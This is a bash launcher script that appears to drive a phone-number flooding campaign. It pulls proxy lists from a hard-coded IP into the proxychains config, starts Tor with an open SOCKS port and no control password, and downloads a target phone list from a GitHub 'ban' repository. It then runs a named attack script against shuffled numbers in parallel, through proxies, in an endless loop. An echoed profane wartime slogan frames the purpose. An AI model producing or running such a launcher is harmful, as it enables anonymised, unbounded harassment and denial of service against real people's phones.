#!/bin/bash

if [ "$1" = "" ]; then
  echo "Run with args: <script name> [phone file] [concurrency] [use proxy]"
  exit 1
else
  SCRIPT="$1"
  echo "DEBUG: run $SCRIPT"
fi

if [ "$2" = "" ]; then
  PHONEBOOK="ph_priority"
else
  PHONEBOOK="$2"
fi
echo "DEBUG: PHONEBOOK=$PHONEBOOK"

if [ "$3" = "" ]; then
  CONCURRENCY="10"
else
  CONCURRENCY="$3"
fi
echo "DEBUG: CONCURRENCY=$CONCURRENCY"

if [ "$4" != "" ]; then
  echo "DEBUG: use proxy list"
  curl -s "http://143.244.166.15/proxy-fast.list" | grep -v '103.250.166.04' | sed -E 's/^([^:]+):([^#]+)#(.+)$/\3 \1 \2/' >> /etc/proxychains/proxychains.conf
  curl -s "http://143.244.166.15/proxy.list" | grep -v '103.250.166.04' | sed -E 's/^([^:]+):([^#]+)#(.+)$/\3 \1 \2/' >> /etc/proxychains/proxychains.conf
fi

tor --RunAsDaemon 1 --CookieAuthentication 0 --HashedControlPassword "" --SocksPort 0.0.0.0:9050

echo "российский военній корабль, иди на хуй!"

wget "https://github.com/imsamurai/ban/raw/master/data/$PHONEBOOK.txt"

while true; do cat "$PHONEBOOK.txt" | shuf | xargs -r -P $CONCURRENCY -L1 -d '\n' proxychains -q ./"$SCRIPT".sh; done;
